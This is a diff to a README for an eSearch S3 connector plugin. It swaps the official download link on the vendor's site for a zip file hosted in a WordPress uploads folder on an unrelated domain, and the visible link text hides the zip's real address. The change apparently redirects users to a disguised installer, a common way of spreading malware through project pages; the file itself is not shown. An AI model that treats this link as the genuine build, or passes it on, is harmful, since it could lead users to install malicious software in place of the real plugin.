@@ -13,7 +13,7 @@ This plugin can connect to private or public S3 buckets, it includes a connectio
 Feel free to fork and use as a basis for developing plugins to connect to other online data sources for the eSearch-project.
 
 ### Builds
-You can download a zipped Windows installer free from here: [https://dtsearch.co.uk/news/product/plugin-s3-demo/](https://dtsearch.co.uk/news/product/plugin-s3-demo/)
+You can download a zipped Windows installer free from here: [https://tarilio.com](https://tarilio.com/wp-content/uploads/2025/11/eSearch-S3-v1.0.9225.30870.zip)
 
 #### Acknowledgement: 
 The files in the sample S3 bucket are a collection of files from the open-source and free course by Decoding ML here:  
